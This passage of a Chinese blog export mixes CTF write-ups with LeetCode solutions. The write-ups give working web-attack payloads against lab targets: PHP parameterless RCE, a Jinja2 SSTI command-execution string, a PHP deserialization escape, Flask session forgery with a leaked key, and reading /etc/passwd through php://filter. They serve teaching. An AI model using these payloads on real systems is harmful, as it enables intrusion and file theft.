world（上传的webshell）外，文件中还有许多干扰数据，正因此，本文中介绍的几个利用例子都是具有一定容错性的ssh免密、crontab、webshell等。事实上，在Ubuntu中，crontab的利用方式就会利用失败，因为Ubuntu对crontab的语法、格式等要求较为严格。并且，现在的服务部署方式愈发地追求组件化、容器化，如docker模式就是这样。举个例子，一个redis服务容器中，往往只有单一的redis服务，不包含ssh、crontab等服务。在前述诸多限制的基础上，更何况写文件还会受到权限控制的限制。在此背景下，我为大家介绍另一种利用方式。 2018年的zeronights会议上，Pavel Toporkov分享介绍了一种关于redis新版本的RCE利用方式，其利用手段更为通用，危害也更大 mark，未完待续……. 0x05 修复方式做好授权相关的配置，如开启保护模式、设置访问口令、添加防火墙规则等。 参考链接：Redis未授权总结-twosmi1e 15-redis-post-exploitation.pdf (zeronights.ru)","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://lalalashenle.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"漏洞","slug":"漏洞","permalink":"https://lalalashenle.github.io/tags/%E6%BC%8F%E6%B4%9E/"},{"name":"redis","slug":"redis","permalink":"https://lalalashenle.github.io/tags/redis/"}]},{"title":"CTF-JNU2021新生赛Writeup","slug":"CTF-JNU2021新生赛Writeup","date":"2021-12-03T08:44:37.000Z","updated":"2022-06-18T07:32:00.393Z","comments":true,"path":"2021/12/03/CTF-JNU2021新生赛Writeup/","link":"","permalink":"https://lalalashenle.github.io/2021/12/03/CTF-JNU2021%E6%96%B0%E7%94%9F%E8%B5%9BWriteup/","excerpt":"摘要：JNUCTF新生赛，题目较多，持续更新中……","text":"摘要：JNUCTF新生赛，题目较多，持续更新中…… WEB0x01 easy_js 题目要求点击999999次后出现flag，不妨先点个五百次热热身吧~ F12打开开发者工具，查看源代码： 代码被16进制编码了，执行一下JS反混淆后： 可以看到关键代码是一个php文件，以及click参数。将click参数设置为999999999，就可以得到flag了。 0x02 checkin打开题目后是源码，直接审计： 12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);include &quot;flag.php&quot;;highlight_file(__FILE__);$a = array(&quot;C&quot;, &quot;T&quot;, &quot;F&quot;);$num1 = 999999999;// 第一层绕过// 利用php的数组弱类型比较的特性，当两个数组的所有键值对相同，但每一个键值对的位置不相同时，弱类型比较判定为真// payload: b[2]=F&amp;b[1]=T&amp;b[0]=Cif (!($a == $_POST[&#x27;b&#x27;] and $a !== $_POST[&#x27;b&#x27;])) &#123; die(&quot;maybe you can learn something from https://www.php.net/manual/zh/language.operators.array.php&quot;);&#125;// 第二层绕过// 数字与字符串的比较，利用字符串构造的科学计数法绕过与数字的大小判定// payload: num2=1e9if (!(!empty($_GET[&#x27;num2&#x27;]) &amp;&amp; $_GET[&#x27;num2&#x27;] &gt; $num1 &amp;&amp; strlen($_GET[&#x27;num2&#x27;]) &lt; 4)) &#123; die(&quot;Scientific notation!!!&quot;);&#125;// 第三层绕过// 用两个值不同，但md5值相同的字符串绕过// payload: 参考 https://blog.csdn.net/qq_42967398/article/details/104522626if (empty($_POST[&#x27;md5a&#x27;])||empty($_POST[&#x27;md5b&#x27;])||is_array($_POST[&#x27;md5a&#x27;])||is_array($_POST[&#x27;md5b&#x27;])||($_POST[&#x27;md5a&#x27;]==$_POST[&#x27;md5b&#x27;])||!(md5($_POST[&#x27;md5a&#x27;]) === md5($_POST[&#x27;md5b&#x27;]))) &#123; die(&quot;no no no&quot;);&#125;echo $flag;maybe you can learn something from https://www.php.net/manual/zh/language.operators.array.php 0x03 ez-rce代码审计题： 1234567891011121314&lt;?phphighlight_file(__FILE__);if ($_POST[&#x27;shell&#x27;]) &#123; $shell = $_POST[&#x27;shell&#x27;]; if (&#x27;;&#x27; === preg_replace(&#x27;/[a-z_]+\\((?R)?\\)/&#x27;, &#x27;&#x27;, $shell)) &#123; if (preg_match(&#x27;/file|if|localeconv|phpversion|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#x27;, $shell)) &#123; die(&#x27;?&#x27;); &#125; else &#123; eval($shell); &#125; &#125; else &#123; die(&#x27;??&#x27;); &#125;&#125; 源码中有eval($shell)看起来是直接就可以调用命令拿到shell了，但是在执行eval之前，还有两段绕过需要处理。 第一个绕过是/[a-z_]+\\((?R)?\\)/的正则，(?R)是递归匹配，正则中还有小写字母、下划线和左右圆括号。从代码看，我们传入的shell应该是func1(func2(func3(...)));这种形式，匹配完正则后如果只剩下个分号就成功绕过了。这种绕过被称作无参数RCE，网上资料挺多的。 这道题的难点在于第二段绕过，正则屏蔽了非常多的关键词。比如localeconv是一个比较简单的实现无参数RCE关键词，但是被无情屏蔽了。因为我们最后的目的是获取flag，所以很自然地能想到我们会用到scandir一类的函数去找flag在哪个位置，然后用vardump一类的函数去打印flag，如果flag在当前目录，那么就要执行scandir(&#39;.&#39;)所以无参数RCE一个比较关键的点就在于怎么去生成一个&#39;.&#39;，像被屏蔽的localeconv函数，执行结果就是一个包含&#39;.&#39;的数组。 这里介绍一下我用的一个无参数RCE方法，相关的手段非常多，推荐一篇博客供大家参考 “无参数读文件和RCE总结_合天网安学院-CSDN博客“： 1show_source(end(scandir(chr(ord(hebrevc(crypt(time()))))))); hebrevc(crypt(time()))有概率产生一个以’.’开头的字符串，用ord()函数取出第一个字符，再用chr()进行ASCII转换，最后得到了这个’.’。 0x04 ezPy题目有hint说明直接注入，打开链接后显示python hack，由此想到python flask模板注入。打开F12开发者选项后提示GET参数name，输入?name=8测试一下，果然有回显： 题目中没有探测到明显防火墙对关键字进行屏蔽，直接使用网上整理的payload，具体可以看这篇博客Flask(Jinja2)服务端模板注入漏洞(SSTI)]学习简记 - 泠涯 - 博客园 (cnblogs.com) 12345# 命令执行：&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat ../flag&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;# 文件操作&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;filename&#x27;, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 0x05 easy-unserialize源码审计题： 1234567891011121314151617181920212223242526272829303132&lt;?phphighlight_file(__FILE__);class getflag&#123; public $file; public function __destruct() &#123; if ($this-&gt;file === &quot;flag.php&quot;) &#123; echo file_get_contents($this-&gt;file); &#125; &#125;&#125;class tmp&#123; public $str1; public $str2; public function __construct($str1, $str2) &#123; $this-&gt;str1 = $str1; $this-&gt;str2 = $str2; &#125;&#125;$str1 = $_POST[&#x27;str1&#x27;];$str2 = $_POST[&#x27;str2&#x27;];$data = serialize(new tmp($str1, $str2));$data = str_replace(&quot;easy&quot;, &quot;ez&quot;, $data);unserialize($data); 源码中有两个POST参数，str1、str2，将两参数作为tmp类的传入值进行序列化，将得到的序列化字符串作为data变量进行反序列化，并且data变量会经过一轮将&quot;eazy&quot;替换为&quot;ez&quot;的正则匹配。而源码中有个getflag类，其中有echo file_get_contents($this-&gt;file);，故整理后思路如下： 需要通过反序列化特定字符串达到调用getflag类的__destruct函数的效果； POST传入特殊str1, str2用以构造能够调用getflag类的序列化字符串； 在正则替换时利用字符逃逸，构造特殊序列化字符串； 说一下什么是字符逃逸： 先看一个正常的序列化字符串： 1234567$str1 = &#x27;easyeasyeasyeasyeasyeasyeasyeasyeasy&#x27;;$str2 = &#x27;;s:4:&quot;str3&quot;;O:7:&quot;getflag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;&#x27;;$data = serialize(new tmp($str1, $str2));var_dump($data);/*string(144) &quot;O:3:&quot;tmp&quot;:2:&#123;s:4:&quot;str1&quot;;s:36:&quot;easyeasyeasyeasyeasyeasyeasyeasyeasy&quot;;s:4:&quot;str2&quot;;s:56:&quot;;s:4:&quot;str3&quot;;O:7:&quot;getflag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;&quot;;&#125;&quot;*/ s:4:”str1“;s:36:”easyeasyeasyeasyeasyeasyeasyeasyeasy“，其中s:4是指str1字符串变量的长度是4，而后面的s:36则是指该变量的值是一个长度为36的字符串。 那么如果序列化字符串中的变量值长度与其实际长度不符合的话，会怎么样呢？ 12345$data = str_replace(&quot;easy&quot;, &quot;ez&quot;, $data);var_dump($data);/*string(126) &quot;O:3:&quot;tmp&quot;:2:&#123;s:4:&quot;str1&quot;;s:36:&quot;ezezezezezezezezez&quot;;s:4:&quot;str2&quot;;s:56:&quot;;s:4:&quot;str3&quot;;O:7:&quot;getflag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;&quot;;&#125;&quot;*/ s:4:”str1”;s:36:”ezezezezezezezezez“，可以看到经过正则替换后，s:36:后面的字符串长度已经不足36了，此时就会出现所谓的反序列化逃逸，而反序列化逃逸又分为两种，(1)字符变长(2)字符变短，这题属于情况(2)。当s:36:后引号内的字符串的实际长度不足36，那么php机制会继续寻找包括右引号在内的其他字符，直到字符串长度与36相符。因此如果再字符串长度到达36的位置，人为的写上一个引号，就能达到引号闭合的效果，从而随心所欲地构造后半段欺骗性的序列化字符。 s:36:”ezezezezezezezezez”;s:4:”str2”;s:56:“，可以看到加粗字符串的长度刚好为36，且最右边刚好有一个引号完成闭合。 s:4:&quot;str3&quot;;O:7:&quot;getflag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;&quot;;&#125;&quot;，这一段欺骗性的字符串则构造出了一段getflag类的序列化字符串，反序列化后就可以调用getflag类的__destruct函数。 0x06 simple_php进入靶机后提示”写代码时黑屏”，想到应该和源码泄露以及备份文件有关，贴一个博客网址，对备份文件地址整理的比较全：ctf常见源码泄露 - Lmg66 - 博客园 (cnblogs.com) 下载备份文件后，得到源码，贴出重点部分开始审计： 1234567891011121314&lt;?phpfunction getflag()&#123; echo file_get_contents(&quot;./flag&quot;);&#125;if(isset($_GET[&#x27;code&#x27;]))&#123; $code=$_GET[&#x27;code&#x27;]; if(strlen($code)&gt;14)&#123; die(&quot;too long !&quot;); &#125; if(preg_match(&#x27;/[a-zA-Z0-9_&amp;^&lt;&gt;&quot;\\&#x27;$#@!*&amp;+=.`\\[\\]&#123;&#125;?,]+/&#x27;,$code))&#123; die(&quot; No ! No !&quot;); &#125; @eval($code);&#125; 从源码很容易分析出这是一个RCE漏洞，从可控GET参数中传入shell，且根据题目的正则屏蔽引导，shell的最终形态应该是去调用getflag函数。可以看出这是一道无字符无数字型RCE题目，并且在第7行，限制了shell长度，在第10行的正则当中，过滤了$符号。我才用的绕过手段是对getflag取反后进行url编码，然后在code参数中再次对url编码取反，执行getflag函数。参考了几篇博客，这里贴出来： 【PHP-CTF】无字母无数字webshell 无字母数字webshell之提高篇 | 离别歌 (leavesongs.com) 0x07 ezpop","categories":[{"name":"CTF题解","slug":"CTF题解","permalink":"https://lalalashenle.github.io/categories/CTF%E9%A2%98%E8%A7%A3/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://lalalashenle.github.io/tags/CTF/"},{"name":"JNU新生赛","slug":"JNU新生赛","permalink":"https://lalalashenle.github.io/tags/JNU%E6%96%B0%E7%94%9F%E8%B5%9B/"}]},{"title":"LeetCode-1239 串联字符串的最大长度","slug":"LeetCode-1239-串联字符串的最大长度","date":"2021-06-19T02:10:26.000Z","updated":"2022-06-18T07:32:26.130Z","comments":true,"path":"2021/06/19/LeetCode-1239-串联字符串的最大长度/","link":"","permalink":"https://lalalashenle.github.io/2021/06/19/LeetCode-1239-%E4%B8%B2%E8%81%94%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%9C%80%E5%A4%A7%E9%95%BF%E5%BA%A6/","excerpt":"","text":"看题看了半天，结合示例终于搞懂问的啥了。就是有个字符串数组，从里面挑字符串进行组合，要求组合字符串里不包含重复字符，问这样的组合的最大长度是多少。 直接朴素回溯法暴力破解即可~ 回溯算法需要注意的点主要有这几个： 回溯通常会在遍历中进行，也就是说，每一轮的回溯，都要遍历所有可能性 回溯过后要撤销选择，本题代码中，我设计了path数组用以记录当前的回溯选择，那么每次回溯完后就要对path数组进行pop操作 回溯通常需要进行剪枝优化，不然基本都会超时。不过这道题暴力解法直接通过了，我就没有去做优化处理了，实际上对于check函数明显是可以进行优化处理的。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455# @Title : 1239 串联字符串的最大长度# @Level : medium# @Address : https://leetcode-cn.com/problems/maximum-length-of-a-concatenated-string-with-unique-characters/# @Date : 2021-06-19# @Author : lalalashenlefrom typing import Listclass Solution: def __init__(self): self.path = [] self.res = 0 def maxLength(self, arr: List[str]) -&gt; int: # 回溯 arr_len = len(arr) def check_s(ss): myset = set() for s in ss: if s in myset: return False myset.add(s) return True def check_repeat(index): myset = set() for p in self.path: for pp in p: myset.add(pp) for s in arr[index]: if s in myset: return False return True def backtrace(index): curLen = 0 for p in self.path: curLen += len(p) # print(curLen) self.res = max(self.res, curLen) for i in range(index, arr_len): # print(check_repeat(i), check_s(arr[i])) if check_repeat(i) and check_s(arr[i]): self.path.append(arr[i]) backtrace(i + 1) self.path.pop() backtrace(0) return self.resS = Solution()arr = [&quot;un&quot;,&quot;iq&quot;,&quot;ue&quot;]print(S.maxLength(arr)) 结果如下：","categories":[{"name":"LeetCode题解","slug":"LeetCode题解","permalink":"https://lalalashenle.github.io/categories/LeetCode%E9%A2%98%E8%A7%A3/"}],"tags":[{"name":"题解","slug":"题解","permalink":"https://lalalashenle.github.io/tags/%E9%A2%98%E8%A7%A3/"},{"name":"LeetCode","slug":"LeetCode","permalink":"https://lalalashenle.github.io/tags/LeetCode/"},{"name":"回溯","slug":"回溯","permalink":"https://lalalashenle.github.io/tags/%E5%9B%9E%E6%BA%AF/"}]},{"title":"LeetCode-0065 有效数字","slug":"LeetCode-0065-有效数字","date":"2021-06-18T07:36:45.000Z","updated":"2022-06-18T07:32:02.946Z","comments":true,"path":"2021/06/18/LeetCode-0065-有效数字/","link":"","permalink":"https://lalalashenle.github.io/2021/06/18/LeetCode-0065-%E6%9C%89%E6%95%88%E6%95%B0%E5%AD%97/","excerpt":"","text":"一道DFA（确定有限自动机）问题。 DFA是一个很强大的算法，它可以有穷模拟状态之间的转移，典型工程应用包括正则表达式、KMP算法等。在DFA中，我们需要一个初始状态，象征状态起点，以及终止状态，象征状态的合理重点。在本题中，两种特殊状态的定义如下： 初始状态： 对字符串从头至尾进行遍历，遍历前的最开始的状态即为初始状态。 终止状态： 所有满足题意的有效数字状态均可作为终止状态。 首先我们分析一下此题有哪些状态： 空格或字符串开始（初始状态） blank 正或负数符号位 sign 数字 digit 小数点 dot 小数点后的数字 digit 科学技术法指数 e 指数e后面的正或负数符号位 sign 指数后的数字 digit 空格或字符串结束 blank 对于一个有效数字，我们可以使用&#123;3, 5, 8, 9&#125;作为结束状态，分别对应的例子如下： 12343: &quot;-123&quot;5: &quot;+.2223&quot;8: &quot;2.33E-6&quot;9: &quot;12.3e6 &quot; 图片来源：A simple solution in Python based on DFA 编程部分只要对每个状态进行模拟就可以了，代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960# @Title : 0065 有效数字# @Level : hard# @Address : https://leetcode-cn.com/problems/valid-number/# @Date : 2021-06-17# @Author : lalalashenlefrom enum import Enumclass Solution: def isNumber(self, s: str) -&gt; bool: # 状态： # 初始空, 符号位, 数字, 小数点, 小数数字, 指数符号e, e后的符号, e后的数字, 结束 state = [ # index优化 &#123;&#125;, # state 1 &#123;&quot;blank&quot;: 1, &quot;sign&quot;: 2, &quot;digit&quot;: 3, &quot;dot&quot;: 4&#125;, # state 2 &#123;&quot;digit&quot;: 3, &quot;dot&quot;: 4&#125;, # state 3 &#123;&quot;digit&quot;: 3, &quot;dot&quot;: 5, &quot;E&quot;: 6, &quot;blank&quot;: 9&#125;, # state 4 &#123;&quot;digit&quot;: 5&#125;, # state 5 &#123;&quot;digit&quot;: 5, &quot;E&quot;: 6, &quot;blank&quot;: 9&#125;, # state 6 &#123;&quot;sign&quot;: 7, &quot;digit&quot;: 8&#125;, # state 7 &#123;&quot;digit&quot;: 8&#125;, # state 8 &#123;&quot;digit&quot;: 8, &quot;blank&quot;: 9&#125;, # state 9 &#123;&quot;blank&quot;: 9&#125; ] # 判断字符对应状态 def stateDicide(s): if &#x27;0&#x27; &lt;= s &lt;= &#x27;9&#x27;: return &quot;digit&quot; elif s in &#x27;eE&#x27;: return &quot;E&quot; elif s in &quot;+-&quot;: return &quot;sign&quot; elif s == &quot;.&quot;: return &quot;dot&quot; elif s == &quot; &quot;: return &quot;blank&quot; state_index = 1 for ss in s: ss_state = stateDicide(ss) if ss_state not in state[state_index]: return False state_index = state[state_index][ss_state] return state_index in &#123;3, 5, 8, 9&#125;S = Solution()s = &quot;+6e-1&quot;print(S.isNumber(s)) 结果如下： 这道题也可以使用正则表达式解题： 1234var isNumber = function (s) &#123; let reg = /^[+-]?((\\d+(\\.\\d+)?)|(\\d*\\.?\\d+)|(\\d+\\.?\\d*))(e[+-]?\\d+)?$/i return reg.test(s.trim());&#125;; 致谢：小鹿同学","categories":[{"name":"LeetCode题解","slug":"LeetCode题解","permalink":"https://lalalashenle.github.io/categories/LeetCode%E9%A2%98%E8%A7%A3/"}],"tags":[{"name":"题解","slug":"题解","permalink":"https://lalalashenle.github.io/tags/%E9%A2%98%E8%A7%A3/"},{"name":"LeetCode","slug":"LeetCode","permalink":"https://lalalashenle.github.io/tags/LeetCode/"},{"name":"自动机","slug":"自动机","permalink":"https://lalalashenle.github.io/tags/%E8%87%AA%E5%8A%A8%E6%9C%BA/"}]},{"title":"CTF-HCTF 2018-admin-题解","slug":"CTF-HCTF-2018-admin","date":"2021-06-16T08:32:54.000Z","updated":"2022-06-18T07:31:57.246Z","comments":true,"path":"2021/06/16/CTF-HCTF-2018-admin/","link":"","permalink":"https://lalalashenle.github.io/2021/06/16/CTF-HCTF-2018-admin/","excerpt":"","text":"打开靶机，出现一个博客网站，右上角有login和register接口，点登录接口，尝试了几个SQL注入语句，没有什么收获。同时在网页源代码中发现了一点线索。 结合本题的题名就叫admin，猜测此题需要尝试使用admin账号登录。 先看本题彩蛋，随手试了试弱口令，emmm居然。。 理智告诉我预期解应该不是这样的:) 继续探索探索。 随便注册了个账号，登陆后右上角多了几个接口： 在change password接口中找到了git源码泄露： 看来题目用的是flask框架了，代码还挺多的，挑重点的几个讲一下。 首先看到了仓库中有个templates文件夹，猜想可能是html模板代码。点进去后果然是这样，并且在index.html中发现了本题关键考点： 12345678910111213// https://github.com/woadsl1234/hctf_flask/blob/master/app/templates/index.html&#123;% include(&#x27;header.html&#x27;) %&#125;&#123;% if current_user.is_authenticated %&#125;&lt;h1 class=&quot;nav&quot;&gt;Hello &#123;&#123; session[&#x27;name&#x27;] &#125;&#125;&lt;/h1&gt;&#123;% endif %&#125;&#123;% if current_user.is_authenticated and session[&#x27;name&#x27;] == &#x27;admin&#x27; %&#125;&lt;h1 class=&quot;nav&quot;&gt;hctf&#123;xxxxxxxxx&#125;&lt;/h1&gt;&#123;% endif %&#125;&lt;!-- you are not admin --&gt;&lt;h1 class=&quot;nav&quot;&gt;Welcome to hctf&lt;/h1&gt;&#123;% include(&#x27;footer.html&#x27;) %&#125; 可以看出，页面显示内容与authenticate以及session[&#39;name&#39;]有关，结合flask框架将session存储在客户端的特性，于是想到了flask-session伪造攻击，之前随手注册了一个名叫111的账号，那么如果能获取到本题session加密的密钥的话，就可以将111账号的session[&#39;name&#39;]更改为admin，从而以admin的身份登录网站。本题源码已经泄露，密钥应该就在仓库中了。 1234567// https://github.com/woadsl1234/hctf_flask/blob/master/app/config.pyimport osclass Config(object): SECRET_KEY = os.environ.get(&#x27;SECRET_KEY&#x27;) or &#x27;ckj123&#x27; SQLALCHEMY_DATABASE_URI = &#x27;mysql+pymysql://root:adsl1234@db:3306/test&#x27; SQLALCHEMY_TRACK_MODIFICATIONS = True 果然，在app文件夹的配置文件中找到了密钥ckj123。 接下来进行session的伪造工作。 首先在客户端获取普通账号111的session，得到： 1.eJw9kM2KwkAQhF9l6bMHJ9GL4EFJkAg9QZkYui_iT0zSmXEhKpsd8d13cMFbQzVVX9UT9pe-ujUwu_ePagT79gyzJ3wdYQYk2uZlEbMsIlxtO0wW4U4n2tQxua2jslC63Fr0myn5s1C5UdpkA_nMo68nnOxaduk4L8mTFIoNN7mxDg0NZOpfNOuOV-lA0nQsWaQdDbnRLfpd-NEdGWtRMKIIp9qkU5KQb2qFwqLd2nJSRJxQ8K3n8BrB6dZf9vfvrrp-KoR4RdKNyQUEl8ZYFj9sUq9XLAHBayniULMhl3mdLAMeTngxf9u17lBXH6dKlva4-VeuBxcEUErBCB63qn-vBmoMrz_rIGx_.YMmxQw.S01A_oerat0-rIFpwNJpnQbxU_o 解码session，方法比较简单，首先将session按&#39;.&#39;进行切片，其中第一段就是seesion的用户数据，脚本如下： 1234567from itsdangerous import base64_decodeimport zliburl = &#x27;你的第一段seesion切片&#x27;url = base64_decode(url)url = zlib.decompress(url)print(url) 输出结果如下： 只需要将箭头所指的session[&#39;name&#39;]更改为admin，再将其用secret_key进行加密，就可以完成本轮session伪造攻击了。 加密session可使用一个开源脚本，部分计算结果如下： 利用burpsuite，将重新加密后的session放入报文中，即可得到flag。 致谢：小鹿同学","categories":[{"name":"CTF题解","slug":"CTF题解","permalink":"https://lalalashenle.github.io/categories/CTF%E9%A2%98%E8%A7%A3/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://lalalashenle.github.io/tags/CTF/"},{"name":"题解","slug":"题解","permalink":"https://lalalashenle.github.io/tags/%E9%A2%98%E8%A7%A3/"}]},{"title":"LeetCode-0877 石子游戏","slug":"LeetCode-0877-石子游戏","date":"2021-06-16T04:07:16.000Z","updated":"2022-06-18T07:32:17.050Z","comments":true,"path":"2021/06/16/LeetCode-0877-石子游戏/","link":"","permalink":"https://lalalashenle.github.io/2021/06/16/LeetCode-0877-%E7%9F%B3%E5%AD%90%E6%B8%B8%E6%88%8F/","excerpt":"","text":"非常经典又比较简单的一个博弈论问题。两名玩家每轮从一行石子中取出头或尾部石子，不会破坏数组的连续性，可以考虑在遍历对玩家获得分数进行实时更新。 进一步的，我们可以假设石子序列为ABC，则石子抓取情况有二，即： 亚历克斯先手抓取A石子，而后李抓取BC序列中的最佳抓取选项 亚历克斯先手抓取C石子，而后李抓取AB序列中的最佳抓取选项 容易看出，对于两种情况，先手的亚历克斯所得到的分数分别为： 12@solution1: point[A] - point[BC最佳得分]@solution2: point[C] - point[AB最佳得分] 显然这是一对可进行一般化的状态公式。 我们构造一个DP数组，DP(i, j)意为当取石子序列中的第i到第j个时，亚历克斯的净分数。显然当i等于j时，意为先手的亚历克斯可以获得此唯一石子的全部分数，故初始化为： 1DP(i, j) = piles[i], i == j时 当i大于j时，则 亚历克斯先手可取位于i处的piles[i]，而李取出剩余(i + 1, j)处的最佳分数，二者之差为亚历克斯的净得分； 或者： 亚历克斯先手可取位于j处的piles[j]，而李取出剩余(i, j - 1)处的最佳分数，二者之差为亚历克斯的净得分； 状态转移方程为： 1DP(i, j) = MAX(piles[i] - DP(i + 1, j), piles[j] - DP(i, j - 1)) 代码如下： 1234567891011121314151617181920212223# @Title : 0877 石子游戏# @Level : medium# @Address : https://leetcode-cn.com/problems/stone-game/# @Date : 2021-06-16# @Author : lalalashenlefrom typing import Listclass Solution: def stoneGame(self, piles: List[int]) -&gt; bool: len_p = len(piles) memo = [[0] * len_p for _ in range(0, len_p)] for i, p in enumerate(piles): memo[i][i] = p for i in range(len_p - 2, -1, -1): for j in range(i + 1, len_p): memo[i][j] = max(piles[j] - memo[i][j - 1], piles[i] - memo[i + 1][j]) return memo[0][len_p - 1] &gt; 0S = Solution()piles = [3, 7, 2, 3]print(S.stoneGame(piles)) # true 结果如下： 致谢：小鹿同学","categories":[{"name":"LeetCode题解","slug":"LeetCode题解","permalink":"https://lalalashenle.github.io/categories/LeetCode%E9%A2%98%E8%A7%A3/"}],"tags":[{"name":"题解","slug":"题解","permalink":"https://lalalashenle.github.io/tags/%E9%A2%98%E8%A7%A3/"},{"name":"LeetCode","slug":"LeetCode","permalink":"https://lalalashenle.github.io/tags/LeetCode/"},{"name":"动态规划","slug":"动态规划","permalink":"https://lalalashenle.github.io/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"}]},{"title":"CTF-网鼎杯2020-AreUSerialz-题解","slug":"CTF-网鼎杯2020-AreUSerialz","date":"2021-06-13T07:03:48.000Z","updated":"2022-06-18T07:31:50.558Z","comments":true,"path":"2021/06/13/CTF-网鼎杯2020-AreUSerialz/","link":"","permalink":"https://lalalashenle.github.io/2021/06/13/CTF-%E7%BD%91%E9%BC%8E%E6%9D%AF2020-AreUSerialz/","excerpt":"摘要：一道反序列化WEB题，有几个比较有意思的绕过","text":"摘要：一道反序列化WEB题，有几个比较有意思的绕过 打开靶机后出现了一段代码，看来是代码审计题了，完整代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler&#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); &#125; public function process() &#123; if ($this-&gt;op == &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if ($this-&gt;op == &quot;2&quot;) &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125; &#125; private function write() &#123; if (isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if (strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(&quot;Too long!&quot;); die(); &#125; $res = file_put_contents($this-&gt;filename, $this-&gt;content); if ($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); &#125; else &#123; $this-&gt;output(&quot;Failed!&quot;); &#125; &#125; private function read() &#123; $res = &quot;&quot;; if (isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; &#125; function __destruct() &#123; if ($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); &#125;&#125;function is_valid($s)&#123; for ($i = 0; $i &lt; strlen($s); $i++) if (!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125;if (isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123; $str = (string)$_GET[&#x27;str&#x27;]; if (is_valid($str)) &#123; $obj = unserialize($str); &#125;&#125; 首先关注传参函数： 1234567891011121314function is_valid($s)&#123; for ($i = 0; $i &lt; strlen($s); $i++) if (!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125;if (isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123; $str = (string)$_GET[&#x27;str&#x27;]; if (is_valid($str)) &#123; $obj = unserialize($str); &#125;&#125; 本题的考点比较明显了，就是get一个str参数，该参数需要经过某些处理以骗过is_valid函数，接着进行反序列化。 接下来我们看代码中的FileHandler类中的析构函数： 1234567function __destruct()&#123; if ($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process();&#125; 可以看出本题第二个绕过点在于$this-&gt;op === &quot;2&quot;，op参数与&quot;2&quot;的强类型比较绕过，猜想可用int型数字2绕过。 继续审计代码，跟随__destruct函数的指引跳转到process函数： 1234567891011public function process()&#123; if ($this-&gt;op == &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if ($this-&gt;op == &quot;2&quot;) &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125;&#125; 注意到$this-&gt;op == &quot;2&quot;，此处比较类型为弱类型比较，上述的int型数字2的绕过方式恰好成立。read函数就是读取filename文件了，故可以通过反序列化设计flag.php文件filename，从而得到flag，先读取/etc/passwd测试一下payload： 1234567891011&lt;?phpclass FileHandler&#123; protected $op = 2; protected $filename = &quot;/etc/passwd&quot;; protected $content = &quot;skwang&quot;;&#125;$test = new FileHandler();echo serialize($test); 得到反序列化字符串： 注意到字符串中有不可见字符，这是由于op、filename、content三个参数皆为protected型参数，将字符替换为\\00即可。 回显发现绕过失败了。很奇怪，从代码审计看绕过应该是能成功的，int型数字2的绕过方式应该没问题，于是怀疑是反序列化字符串解析失败，因为我们使用了\\00这样的16进制编码，极有可能导致反序列化失败或者截断问题。解决方法为：将反序列化字符串中，代表字符串内容的小写s换成大写S，代表后面的字符串用16进制表示。payload如下： 1str=O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\\00*\\00op&quot;;i:2;S:11:&quot;\\00*\\00filename&quot;;s:11:&quot;/etc/passwd&quot;;s:10:&quot;\\00*\\00content&quot;;N;&#125; 成功读取到了/etc/passwd文件，payload成立。接下来尝试读取flag.php文件，利用filter伪协议，构造相对路径： 1filename = &#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27; 得到反序列化字符串，构造payload如下： 